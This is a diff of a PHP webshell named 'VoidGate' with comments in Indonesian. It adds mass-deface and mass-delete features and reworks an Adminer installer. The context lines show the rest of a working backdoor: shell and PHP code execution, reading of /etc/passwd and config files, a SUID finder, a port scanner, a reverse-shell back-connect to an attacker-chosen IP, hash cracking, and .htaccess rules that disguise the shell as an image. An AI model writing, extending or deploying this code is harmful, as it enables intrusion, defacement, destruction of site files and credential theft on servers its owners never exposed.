@@ -18,7 +18,6 @@ $CONFIG = [
     'title'             => 'VoidGate_<DekstopSite',
     'author'            => '0x6ick x Nyx6st',
     'password'          => 'admin', /*default admin.isi   null tanpa 'untuk menonaktifkan.*/
-    'adminer_filename'  => 'db_admin.php' // Nama file kustom untuk Adminer
 ];
 
 // --- HEX-ENCODED ---
@@ -33,27 +32,108 @@ if (isset($_GET['self_destruct'])) {
 session_start();
 if (isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }
 if (isset($_GET['phpinfo'])) { phpinfo(); exit; }
-if (isset($_POST['db_login'])) {
-    $loader_status = load_adminer();
-    if ($loader_status === true) { $_SESSION['db_login'] = $_POST; function adminer_object() { class AdminerSoftware extends Adminer { function name() { return 'VoidGate DB'; } function credentials() { return [$_SESSION['db_login']['server'], $_SESSION['db_login']['username'], $_SESSION['db_login']['password']]; } function database() { return $_SESSION['db_login']['db']; } function login($login, $password) { return true; } } return new AdminerSoftware; } include __DIR__ . '/' . $CONFIG['adminer_filename']; exit; }
-    else { $_SESSION['adminer_error'] = $loader_status; redirect(['p' => 'db']); }
-}
-if (isset($_GET['db']) && isset($_SESSION['db_login'])) {
-    $adminer_file = __DIR__ . '/' . $CONFIG['adminer_filename'];
-    if ($f[4]($adminer_file)) { $_GET['username'] = ''; include $adminer_file; exit; }
-    else { $_SESSION['adminer_error'] = "Adminer file not found. Please log in again to download it."; redirect(['p' => 'db']); }
-}
+
+// --- LOGIN HANDLER ---
 if ($CONFIG['password'] && (!isset($_SESSION['authed']) || !$_SESSION['authed'])) {
-    if (isset($_POST['pass']) && $_POST['pass'] === $CONFIG['password']) { $_SESSION['authed'] = true; }
-    else { die('<style>body{background:#1a1a1a;color:cyan;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}form{border:1px solid cyan;padding:20px;}input{background:transparent;color:cyan;border:1px solid cyan;padding:5px;}</style><form method="POST">Password: <input type="password" name="pass"><input type="submit" value="Enter"></form>'); }
+    if (isset($_POST['pass']) && $_POST['pass'] === $CONFIG['password']) {
+        $_SESSION['authed'] = true;
+    } else {
+        die('<style>body{background:#1a1a1a;color:cyan;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}form{border:1px solid cyan;padding:20px;}input{background:transparent;color:cyan;border:1px solid cyan;padding:5px;}</style><form method="POST">Password: <input type="password" name="pass"><input type="submit" value="Enter"></form>');
+    }
 }
 
 // --- helper ---
-function load_adminer() { global $f, $CONFIG; $adminer_file=__DIR__.'/'.$CONFIG['adminer_filename']; if($f[4]($adminer_file))return true; if(!$f[36](__DIR__))return"Error: Directory not writable."; $url='https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php'; $content=false; if($f[0]('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);$content=curl_exec($ch);curl_close($ch);}elseif($f[27]('allow_url_fopen')){$content=@$f[2]($url);}else{return"Error: cURL & allow_url_fopen are disabled.";} if($content){if($f[3]($adminer_file,$content))return true;else return"Error: Failed to write Adminer file.";}return"Error: Failed to download Adminer.";}
+function load_adminer($output_filename) {
+    global $f;
+    $adminer_path = __DIR__ . '/' . $output_filename;
+
+    if (!$f[36](__DIR__)) {
+        return "Error: Direktori saat ini tidak writable.";
+    }
+    
+    //adminer dwnld
+    $url = 'https://www.adminer.org/latest.php';
+    $content = false;
+    
+    if ($f[0]('curl_init')) { // function_exists
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    } elseif ($f[27]('allow_url_fopen')) { // ini_get
+        $content = @$f[2]($url); // file_get_contents
+    } else {
+        return "Error: cURL dan allow_url_fopen nonaktif. Tidak bisa download.";
+    }
+    
+    if ($content) {
+        if ($f[3]($adminer_path, $content)) { // file_put_contents
+            return true;
+        } else {
+            return "Error: Gagal menyimpan file Adminer.";
+        }
+    }
+    
+    return "Error: Gagal mendownload konten Adminer.";
+}
 function executeCommand($cmd){global $f;if($f[0]('shell_exec'))return $f[25]($cmd);if($f[0]('exec')){exec($cmd,$o);return implode("\n",$o);}if($f[0]('passthru')){ob_start();passthru($cmd);return ob_get_clean();}if($f[0]('system')){ob_start();system($cmd);return ob_get_clean();}return"Execution disabled.";}
 function formatSize($b){if($b>=1073741824)return number_format($b/1073741824,2).' GB';if($b>=1048576)return number_format($b/1048576,2).' MB';if($b>=1024)return number_format($b/1024,2).' KB';return $b.' B';}
 function getPerms($file){global $f;$p=@$f[16]($file);$i='u';if(($p&0xC000)==0xC000)$i='s';elseif(($p&0xA000)==0xA000)$i='l';elseif(($p&0x8000)==0x8000)$i='-';elseif(($p&0x6000)==0x6000)$i='b';elseif(($p&0x4000)==0x4000)$i='d';elseif(($p&0x2000)==0x2000)$i='c';elseif(($p&0x1000)==0x1000)$i='p';$i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));$i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));$i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));return $i;}
 function deleteRecursive($dir){global $f;if(!$f[5]($dir))return $f[6]($dir);$items=array_diff($f[8]($dir),['.','..']);foreach($items as $item){$path=$dir.DIRECTORY_SEPARATOR.$item;if($f[5]($path))deleteRecursive($path);else $f[6]($path);}return $f[7]($dir);}
+//massdeface
+function massDefaceRecursive($dir, $filename, $content, &$results, $force = false) {
+    global $f;
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($iterator as $item) {
+            if ($f[5]($item->getPathname())) { // is_dir()
+                $path = $item->getPathname();
+                $target_file = $path . DIRECTORY_SEPARATOR . $filename;
+                
+                // -- PENAMBAHAN FITUR FORCE MODE --
+                if ($force && !$f[36]($path)) { // is_writable()
+                    @$f[20]($path, 0755); // chmod()
+                }
+                
+                if (@$f[3]($target_file, $content)) { // file_put_contents()
+                    $results['success'][] = $target_file;
+                } else {
+                    $results['failed'][] = $target_file;
+                }
+            }
+        }
+    } catch (Exception $e) {
+        $results['failed'][] = "Error scanning directory $dir: " . $e->getMessage();
+    }
+}
+
+// FUNGSI BARU UNTUK MASS DELETE
+function massDeleteRecursive($dir, $filename, &$results) {
+    global $f;
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::LEAVES_ONLY // Hanya proses file, bukan direktori
+        );
+        foreach ($iterator as $item) {
+            if ($item->isFile() && $item->getFilename() === $filename) {
+                $target_file = $item->getPathname();
+                if (@$f[6]($target_file)) { // unlink()
+                    $results['success'][] = $target_file;
+                } else {
+                    $results['failed'][] = $target_file;
+                }
+            }
+        }
+    } catch (Exception $e) {
+        $results['failed'][] = "Error scanning directory $dir: " . $e->getMessage();
+    }
+}
 function redirect($params=[]){header("Location: ?".http_build_query(array_filter($params)));exit;}
 function zipFolder($z,$fo,$bP){global $f;$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fo),RecursiveIteratorIterator::LEAVES_ONLY);foreach($files as $name=>$file){if(!$file->isDir()){$fP=$file->getRealPath();$rP=substr($fP,strlen($bP)+1);$z->addFile($fP,$rP);}}}
 function findInterestingDirs($start_dir,&$results,$depth=0){global $f;if($depth>4)return;$common_dirs=['/tmp','/var/tmp','/home/'];if($depth==0){$scan_dirs=array_unique(array_merge([$start_dir,$f[12]($start_dir)],$common_dirs));}else{$scan_dirs=[$start_dir];}foreach($scan_dirs as $dir){if(@$f[36]($dir)){$results[]=$dir;}if($depth>0&&$f[5]($dir)){$items=@$f[8]($dir);if(!$items)continue;foreach($items as $item){if($item=='.'||$item=='..')continue;$path=$dir.'/'.$item;if($f[5]($path))findInterestingDirs($path,$results,$depth+1);}}}}
@@ -104,12 +184,73 @@ if($action==='delete'){if(deleteRecursive($target_path))redirect(['p'=>'files','
 <?php switch($page):case'dashboard':?><div class="dashboard-grid"><div class="action-box"><h3>Info Server</h3><table style="width:100%"><tr><td><b>Uname</b></td><td><?php echo $f[14]($f[23]());?></td></tr><tr><td><b>User</b></td><td><?php echo $f[14]($f[40]());?></td></tr><tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR']?$_SERVER['SERVER_ADDR']:gethostbyname($_SERVER['HTTP_HOST']);?></td></tr><tr><td><b>Your IP</b></td><td><?php echo $_SERVER['REMOTE_ADDR'];?></td></tr><tr><td><b>Disabled</b></td><td style="word-break:break-all;"><?php echo $f[14]($f[27]('disable_functions'))?:'<i>None</i>';?></td></tr></table></div><div class="action-box"><h3>Info Disk</h3><?php $ds_root=stristr(PHP_OS,'WIN')?'C:':'/';$total_space=@$f[38]($ds_root);$free_space=@$f[39]($ds_root);if($total_space&&$free_space){$used_space=$total_space-$free_space;$used_percent=round(($used_space/$total_space)*100);echo'<p>'.formatSize($used_space).' / '.formatSize($total_space).' ('.$used_percent.'%)</p><div class="progress-bar"><div style="width:'.$used_percent.'%;">'.$used_percent.'%</div></div>';}else{echo'<p>Tidak dapat mengambil info disk.</p>';}?></div><div class="action-box"><h3>Pengguna Server</h3><pre><?php $passwd=@$f[2]('/etc/passwd');if($passwd){echo $f[14]($passwd);}else{echo'<i>Tidak dapat membaca /etc/passwd</i>';}?></pre></div><div class="action-box"><h3>Direktori Writable</h3><pre><?php $writable_dirs=[];findInterestingDirs($path,$writable_dirs);if(!empty($writable_dirs)){foreach(array_unique($writable_dirs)as $dir){echo $f[14]($dir)."\n";}}else{echo'<i>Tidak ada direktori writable yang ditemukan.</i>';}?></pre></div></div><?php break; case'cmd':?><div class="action-box"><h3>Command Execution</h3><form method="POST"><input type="text" name="cmd" placeholder="e.g. whoami" autofocus><input type="submit" value="Execute"></form><?php if(isset($_POST['cmd'])):?><h3>Output:</h3><pre><?php echo $f[14](executeCommand($_POST['cmd']));?></pre><?php endif;?></div><?php break;
 case'eval':?><div class="action-box"><h3>PHP Code Executor</h3><form method="POST"><textarea name="php_code" placeholder="e.g. echo phpversion();"><?php if(isset($_POST['php_code']))echo $f[14]($_POST['php_code']);?></textarea><input type="submit" value="Execute PHP"></form><?php if(isset($_POST['php_code'])):?><h3>Output:</h3><pre><?php ob_start();$f[30]($_POST['php_code']);echo $f[14](ob_get_clean());?></pre><?php endif;?></div><?php break;
 case'info':?><div class="action-box"><h3>PHP Information</h3><iframe id="phpinfo-iframe" src="?phpinfo=true"></iframe></div><?php break;
-case'db':?><div class="action-box"><h3>Database Manager (Adminer)</h3><?php if(isset($_SESSION['adminer_error'])){echo'<div class="message error">'.$f[14]($_SESSION['adminer_error']).'</div>';unset($_SESSION['adminer_error']);}?><form method="POST"><table style="width:auto;"><tr><td>Server</td><td><input type="text" name="server" value="127.0.0.1"></td></tr><tr><td>User</td><td><input type="text" name="username" value="root"></td></tr><tr><td>Pass</td><td><input type="password" name="password"></td></tr><tr><td>DB</td><td><input type="text" name="db"></td></tr></table><input type="submit" name="db_login" value="Login to Database"></form><p>Tip: Find credentials using Mass Tools -> Config Finder.</p></div><?php break;
+case'db':?>
+    <div class="action-box">
+        <h3>Adminer Installer</h3>
+        <p>Fitur ini akan mengunduh file Adminer terbaru ke direktori saat ini. Setelah itu, kamu bisa mengaksesnya langsung untuk me-manage database.</p>
+        <form method="POST">
+            <p>Nama File untuk Adminer:<br>
+            <input type="text" name="adminer_filename" value="db_manager.php"></p>
+            <input type="submit" name="install_adminer" value="Install Adminer">
+        </form>
+
+        <?php
+        if (isset($_POST['install_adminer'])) {
+            $filename = $_POST['adminer_filename'];
+            if (empty($filename)) {
+                echo '<div class="message error">Nama file tidak boleh kosong.</div>';
+            } else {
+                $result = load_adminer($filename);
+                if ($result === true) {
+                    $link = $f[14]($filename);
+                    echo '<div class="message success">Adminer berhasil diinstall! <br>Akses di: <a href="'.$link.'" target="_blank" style="color:#000;font-weight:bold;">'.$link.'</a></div>';
+                } else {
+                    echo '<div class="message error">'.$f[14]($result).'</div>';
+                }
+            }
+        }
+        ?>
+    </div>
+<?php break;
 case'mass':?>
     <div class="action-box"><h3>Config Finder</h3><form method="POST"><p>Click the button to automatically find main config files by traversing up from the current directory.</p><input type="submit" name="find_configs" value="Find Root Configs"></form><?php if(isset($_POST['find_configs'])){$results=[];smartConfigFinder($results);if(!empty($results)){echo'<h3>Configs Found:</h3><pre>';foreach($results as $r){echo'<b>'.$f[14]($r).'</b>'."\n".'<code style="color:var(--highlight)">'.$f[14]($f[2]($r)).'</code>'."\n\n";}echo'</pre>';}else{echo'<p>No main config files found.</p>';}}?></div>
     <div class="action-box"><h3>String Finder</h3><form method="POST"><p>Directory to search: <input type="text" name="search_dir" value="<?php echo $f[14]($path);?>"></p><p>String/Pattern: <input type="text" name="search_query" required></p><p><label><input type="checkbox" name="is_regex" style="width:auto;"> Use Regular Expression</label></p><input type="submit" name="string_finder" value="Find String"></form><?php if(isset($_POST['string_finder'])){$results=[];findStringsInFiles($_POST['search_dir'],$_POST['search_query'],isset($_POST['is_regex']),$results);if(!empty($results)){echo'<h3>Files containing "'.$f[14]($_POST['search_query']).'":</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No files found containing that string.</p>';}}?></div>
     <div class="action-box"><h3>SUID/SGID Finder</h3><form method="POST"><p>Directory to scan: <input type="text" name="suid_dir" value="/usr/bin"></p><input type="submit" name="suid_finder" value="Find SUID/SGID Files"></form><?php if(isset($_POST['suid_finder'])){$results=[];findSuidSgidFiles($_POST['suid_dir'],$results);if(!empty($results)){echo'<h3>Potentially exploitable files found:</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No SUID/SGID files found in that directory.</p>';}}?></div>
-    <div class="action-box"><h3>Mass Deface</h3><form method="POST"><p>Target Folder:<br><input type="text" name="deface_dir" value="<?php echo $f[14]($path);?>"></p><p>Filename:<br><input type="text" name="deface_filename" value="index.html"></p><p>File Content:<br><textarea name="deface_content">Hacked</textarea></p><input type="submit" name="start_deface" value="Start Mass Deface"></form><?php if(isset($_POST['start_deface'])){$results=['success'=>[],'failed'=>[]];massDefaceRecursive($_POST['deface_dir'],$_POST['deface_filename'],$_POST['deface_content'],$results);echo'<h3>Results:</h3><p>Success ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';}?></div>
+    
+    <div class="action-box">
+        <h3>Mass Deface v2</h3>
+        <form method="POST">
+            <p>Target Folder:<br><input type="text" name="deface_dir" value="<?php echo $f[14]($path);?>"></p>
+            <p>Filename:<br><input type="text" name="deface_filename" value="index.html"></p>
+            <p>File Content:<br><textarea name="deface_content">Hacked</textarea></p>
+            <p><label><input type="checkbox" name="force_mode" value="1" style="width:auto; vertical-align:middle;"> <b>Force Mode</b> (Coba chmod 0755 pada direktori)</label></p>
+            <input type="submit" name="start_deface" value="Start Mass Deface">
+        </form>
+        <?php 
+        if(isset($_POST['start_deface'])){
+            $results=['success'=>[],'failed'=>[]];
+            $force_mode = isset($_POST['force_mode']);
+            massDefaceRecursive($_POST['deface_dir'],$_POST['deface_filename'],$_POST['deface_content'],$results, $force_mode);
+            echo'<h3>Results:</h3><p>Success ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';
+        }
+        ?>
+    </div>
+
+    <div class="action-box">
+        <h3>Mass Delete</h3>
+        <form method="POST">
+            <p>Target Folder:<br><input type="text" name="delete_dir" value="<?php echo $f[14]($path);?>"></p>
+            <p>Filename to Delete:<br><input type="text" name="delete_filename" value="index.html"></p>
+            <input type="submit" name="start_delete" value="Start Mass Delete" style="background-color:var(--error);color:#fff;">
+        </form>
+        <?php
+        if(isset($_POST['start_delete'])){
+            $results=['success'=>[],'failed'=>[]];
+            massDeleteRecursive($_POST['delete_dir'],$_POST['delete_filename'], $results);
+            echo'<h3>Results:</h3><p>Deleted ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';
+        }
+        ?>
+    </div>
     <?php break;
 case'net':?><div class="action-box"><h3>Port Scanner</h3><form method="POST"><p>Host: <input type="text" name="scan_host" value="127.0.0.1"> Ports (comma separated): <input type="text" name="scan_ports" value="21,22,80,443,3306,5432"></p><input type="submit" name="port_scan" value="Scan Ports"></form><?php if(isset($_POST['port_scan'])){echo'<h3>Scan Results:</h3><pre>';$ports=explode(',',$_POST['scan_ports']);foreach($ports as $p){$p=trim($p);if(!$p)continue;$conn=@$f[33]($_POST['scan_host'],$p,$errno,$errstr,1);if($conn){echo"Port $p: [OPEN]\n";@fclose($conn);}else{echo"Port $p: [CLOSED]\n";}}echo'</pre>';}?></div><div class="action-box"><h3>Back-Connect</h3><form method="POST"><p>IP Address: <input type="text" name="bc_ip" placeholder="Your IP"> Port: <input type="text" name="bc_port" placeholder="Your Port"></p><input type="submit" name="back_connect" value="Connect"></form><?php if(isset($_POST['back_connect'])){$ip=$_POST['bc_ip'];$port=$_POST['bc_port'];if($f[0]($f[34])&&$f[0]($f[35])){$pid=@$f[34]();if($pid){@$f[35]();$sock=@$f[33]($ip,$port);if($sock){@dup2($sock,0);@dup2($sock,1);@dup2($sock,2);$shell=@$f[30]('return "'.(stristr(PHP_OS,'WIN')?'cmd.exe':'/bin/sh -i').'";');@$f[25]($shell);}else{echo'<pre>Connection Failed.</pre>';}}}else{echo'<pre>Error: pcntl_fork or posix_setsid not available.</pre>';}}?></div><?php break;
 case'crypto':?><div class="action-box"><h3>Hash Identifier & Cracker</h3><form method="POST"><p>Hash:</p><textarea name="hash_input" style="height:100px;"><?php echo isset($_POST['hash_input'])?$f[14]($_POST['hash_input']):'';?></textarea><input type="submit" name="hash_tools" value="Identify & Crack"></form><?php if(isset($_POST['hash_tools'])){$hash=trim($_POST['hash_input']);echo'<h3>Results for: '.$f[14]($hash).'</h3>';$type=identify_hash($hash);echo'<p><b>Detected Type:</b> '.$f[14]($type).'</p>';$cracked=crack_hash_api($hash);if($cracked){echo'<p><b>CrackStation API Result:</b> <span style="color:var(--success);font-weight:bold;">'.$f[14]($cracked).'</span></p>';}else{echo'<p><b>CrackStation API Result:</b> Not Found</p>';}}?></div><div class="action-box"><h3>HTAccess Persistence</h3><form method="POST"><p>File to Hide (e.g., this shell): <input type="text" name="hide_file" value="<?php echo$f[14]($f[13](__FILE__));?>"></p><p>Fake Name (e.g., logo.png): <input type="text" name="fake_name" value="logo.png"></p><input type="submit" name="htaccess_inject" value="Inject Rule to .htaccess"></form><?php if(isset($_POST['htaccess_inject'])){$htaccess_path=$path.'/.htaccess';$rule="\nRewriteEngine On\nRewriteRule ^".$f[14]($_POST['fake_name'])."$ ".$f[14]($_POST['hide_file'])." [L]\n";if($f[3]($htaccess_path,$f[2]($htaccess_path).$rule)!==false){echo'<p style="color:var(--success)">Rule injected! Now try to access '.$f[14]($_POST['fake_name']).'</p>';}else{echo'<p style="color:var(--error)">Failed to write to .htaccess</p>';}}?></div><div class="action-box"><h3>Self Destruct</h3><p>This will permanently delete this webshell file from the server.</p><a href="?self_destruct=true" onclick="return confirm('ARE YOU ABSOLUTELY SURE? This action is irreversible.')" style="color:var(--error);font-weight:bold;">[ Self Destruct Now ]</a></div><?php break;case'files':default:$action_target=isset($_GET['target'])?$f[11]($path.'/'.$_GET['target']):'';if($action=='edit'&&$f[4]($action_target)){echo'<div class="action-box"><h3>Edit: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><textarea name="content">'.$f[14]($f[2]($action_target)).'</textarea><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="edit_save" value="Save"></form></div>';}elseif($action=='chmod'){echo'<div class="action-box"><h3>Chmod: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="perms" value="'.substr($f[17]('%o',@$f[16]($action_target)),-4).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="chmod_save" value="Save"></form></div>';}elseif($action=='rename'){echo'<div class="action-box"><h3>Rename: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="new_name" value="'.$f[14]($f[13]($action_target)).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="rename_save" value="Rename"></form></div>';}elseif($action=='extract'){echo'<div class="action-box"><h3>Extract: '.$f[14]($f[13]($action_target)).'</h3><p>Extract to current directory?</p><form method="POST"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="extract_save" value="Yes, Extract"></form></div>';}else{?><div class="path-nav"><strong>Path:</strong> <?php $path_parts=explode('/',str_replace('\\','/',$path));$built_path='';foreach($path_parts as $i=>$part){if(empty($part)&&$i==0){echo'<a href="?p=files&path=/">/</a>';continue;}if(empty($part))continue;$built_path.='/'.$part;echo'<a href="?p=files&path='.urlencode($built_path).'">'.$f[14]($part).'</a>/';}?></div><div class="action-box"><h3>Upload</h3><form method="POST" enctype="multipart/form-data"><input type="file" name="upload_file"><input type="submit" value="Upload"></form></div><div class="action-box"><h3>Create</h3><form method="POST"><select name="type" style="width:auto;"><option value="file">File</option><option value="dir">Directory</option></select><input type="text" name="name" placeholder="Name" required style="width:auto;margin:0 10px;"><input type="submit" name="create" value="Create"></form></div><form method="POST"><table class="file-table"><thead><tr><th><input type="checkbox" onclick="document.querySelectorAll('.file-checkbox').forEach(c=>c.checked=this.checked)"></th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead><tbody><?php if($path!='/')echo'<tr><td colspan="6"><a href="?p=files&path='.urlencode($f[12]($path)).'">.. (Parent)</a></td></tr>';$files=@$f[8]($path);$dirs_list=[];$files_list=[];if($files){foreach($files as $file){if($file=='.'||$file=='..')continue;if($f[5]($path.'/'.$file))$dirs_list[]=$file;else $files_list[]=$file;}}sort($dirs_list);sort($files_list);$sorted_list=array_merge($dirs_list,$files_list);foreach($sorted_list as $file){$file_path=$path.'/'.$file;$is_dir=$f[5]($file_path);$actions_link='?p=files&target='.urlencode($file).'&path='.urlencode($path);echo'<tr><td data-label="Select"><input type="checkbox" class="file-checkbox" name="selected_files[]" value="'.$f[14]($file_path).'"></td>';echo'<td data-label="Name">';if($is_dir)echo'<a href="?p=files&path='.urlencode($file_path).'"><b>'.$f[14]($file).'</b></a>';else echo $f[14]($file);echo'</td>';echo'<td data-label="Size">'.($is_dir?'DIR':formatSize(@$f[15]($file_path))).'</td>';echo'<td data-label="Permissions"><a href="'.$actions_link.'&action=chmod">'.getPerms($file_path).'</a></td>';echo'<td data-label="Modified">'.$f[18]("Y-m-d H:i:s",@$f[19]($file_path)).'</td>';echo'<td data-label="Actions" class="file-actions">';if(!$is_dir)echo'<a href="'.$actions_link.'&action=edit">Edit</a>';echo'<a href="'.$actions_link.'&action=rename">Rename</a>';if(!$is_dir&&$f[29]('ZipArchive')&&@$f[28]($file_path)['extension']=='zip')echo'<a href="'.$actions_link.'&action=extract">Extract</a>';echo'<a href="'.$actions_link.'&action=delete" onclick="return confirm(\'Delete?\')">Del</a>';echo'</td></tr>';}?></tbody></table><?php if($f[29]('ZipArchive')):?><div style="margin-top:10px;"><input type="submit" name="zip_selected" value="Zip Selected"></div><?php endif;?></form><?php }break;endswitch;?><div style="text-align:center;margin-top:20px;padding:10px;color:#777;">VoidGate by <?php echo$f[14]($CONFIG['author']);?> - 2025</div></div></body></html>
